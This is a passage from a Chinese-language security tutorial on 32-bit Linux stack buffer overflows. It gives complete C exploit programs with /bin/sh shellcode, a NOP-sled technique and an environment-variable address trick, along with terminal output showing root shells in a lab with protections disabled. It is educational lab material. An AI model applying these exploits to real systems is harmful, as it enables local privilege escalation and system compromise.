    for(int i=0; i< size/2; i++){ // 将缓冲区的一半填充 NOP
        buffer[i]='\x90';
    }

    ptr = buffer + size/2; // 定位NOP 末尾的地址
    for(int i=0; i<strlen(shellcode); i++){  // 填充 shellcode
        *(ptr++)=shellcode[i];
    }
 
    buffer[size]=0; // 缓冲区最后一个字节设置为字符串结束符 '\0'
                    // 以下代码用于测试生成的攻击缓冲区字符串
    FILE *fp = NULL;
    fp = fopen("./mycode","wb");
    size_t len = fwrite(buffer,size,1,fp);
    printf("buffer has written in mycode\n");
    fclose(fp);
    
    execl("./meet","meet",buffer,0);  // 参数分别表示 可执行程序路径，argv[0] argv[1]...，最后是空指针结束
    printf("%s\n",buffer);
    free(buffer);                     // 清理堆内存
    return 0;
}
```

编译执行：

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ sudo make
cc -ggdb -O0 -fno-stack-protector -zexecstack -mpreferred-stack-boundary=2 -m32     exploit.c   -o exploit
                                                                                                    
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ sudo chmod u+s exploit
                                                                                                    
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./exploit 600 650
Usage: ./exploit <buff_size> <offset> <esp:0xfff...>
ESP:0xffffd3fc Offset:0x28a Return:0xffffd172
buffer has written in mycode
Hello ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????1?1۰̀?^?1??F?F
                   ?
                    ???V
                        ̀ۉ?@̀?????/bin/sh???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???r???
# 
```

成功了。我们使用 sudo 编译程序并将其设置为 SUID 程序。当以普通用户运行漏洞攻击程序，我们就会得到一个根 shell。这里我们使用 600 字节的缓冲区，确保能覆盖返回地址，提高了一定的容错性。上述的参数 650，在不同的系统运行可能需要适当地调整。

### 5.4 对小缓冲区进行漏洞攻击

```c
// exploit2.c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#define VULN "./smallbuff"
#define SIZE 160

char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int main(){
    char p[SIZE];    // 小缓冲区，只保存返回地址
   char *env[] = {shellcode,NULL};  // 环境变量,以空指针结束

    char *vuln[] = {VULN,p,NULL};   // 
    int *ptr,i,addr;
    addr = 0xffffdff8 - strlen(shellcode)-strlen(VULN);
    fprintf(stderr,"[***] using address: %#010x\n",addr);

    ptr  = (int*)(p+2);
    for(int i=0;i<SIZE;i+=4){
        *ptr++=addr;
    }

    execle(vuln[0],(char*)vuln,p,NULL,env);
    
    //int execle(constchar *path, const char *arg,..., char * const envp[]);
    //第一个参数：全路径
    //env[],表示传递的是环境变量的数组

    return 0;
}
```

编译运行：

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ sudo make              
cc -ggdb -O0 -fno-stack-protector -zexecstack -mpreferred-stack-boundary=2 -m32     exploit2.c   -o exploit2
                                                                                                    
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ sudo chmod u+s exploit2
                                                                                                    
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ ./exploit2
[***] using address: 0xffffdfb8
# 
```

可以看到成功获得了根shell，上述代码的原理是什么呢？其实这是一位叫 Murat Balaban 的土耳其黑客发明的，它依赖于以下事实，即所有的 Debian Linux ELF 文件在映射到内存空间时会将最后的相对地址设置为 `0xffffdff8`，环境变量和参数存储在这个位置，在这些数据以下就是栈空间。如下所示：一个进程内存空间的高端以空值结尾，接着是程序名称，然后是环境变量，最后是参数。

```
										高端进程内存
+----------------------------------------------------------------------+
｜    栈空间    ｜ 参数和环境变量 ｜  Shellcode  ｜  程序名称    ｜  4个空字节｜ 
+----------------------------------------------------------------------+
｜                             |                                        |
｜                             |                                        |
低内存地址                   shellcode 地址                            高内存地址
0x11111111									                                   0xffffdff8
```

在 Debian 系统下，它是`0xffffdff8`，其它Linux发行版可能有差异。获取该地址的方法如下：

用 GDB 打开任何一个可执行程序：

```
┌──(kali㉿bad)-[~/hacker/GrayHatHacking]
└─$ gdb get_sp
(gdb) start
Temporary breakpoint 1 at 0x11be
Starting program: /home/kali/hacker/GrayHatHacking/get_sp 

Temporary breakpoint 1, 0x565561be in main ()
(gdb) x/400s $esp
0xffffd3e0:	""
0xffffd3e1:	"\324\377\377"
0xffffd3e5:	""
0xffffd3e6:	""
......
0xffffdf36:	"LESS_TERMCAP_so=\033[01;33m"
0xffffdf4f:	"LESS_TERMCAP_se=\033[0m"
0xffffdf64:	"LESS_TERMCAP_us=\033[1;32m"
0xffffdf7c:	"LESS_TERMCAP_ue=\033[0m"
0xffffdf91:	"_=/home/kali/hacker/GrayHatHacking/get_sp"
0xffffdfbb:	"LINES=25"
0xffffdfc4:	"COLUMNS=100"
0xffffdfd0:	"/home/kali/hacker/GrayHatHacking/get_sp"
0xffffdff8:	""
```

一直按回车键，直到看到以下内容。`"/home/kali/hacker/GrayHatHacking/get_sp"`表示可执行文件的绝对地址，它下面的地址 `0xffffdff8`就是我们需要的地址。



## 6 漏洞攻击开发过程

在现实世界中，漏洞程序并不像 meet.c 示例那么简单，有时可能需要一个反复试验的过程才能成功实施漏洞攻击。漏洞攻击的开发过程通常遵循以下步骤：

1. 控制 eip：通过溢出使其拒绝服务，即表示控制了eip
2. 确定偏移
3. 确定攻击途径：应该采用什么方式使其溢出
4. 构建漏洞攻击三明治：即 NOP+shellcode+addr
5. 测试漏洞攻击
6. 如有必要调试漏洞攻击程序

起初应该完全遵循这些步骤，熟练了以后可以根据需要将某些步骤合并。

### 6.1 控制 EIP
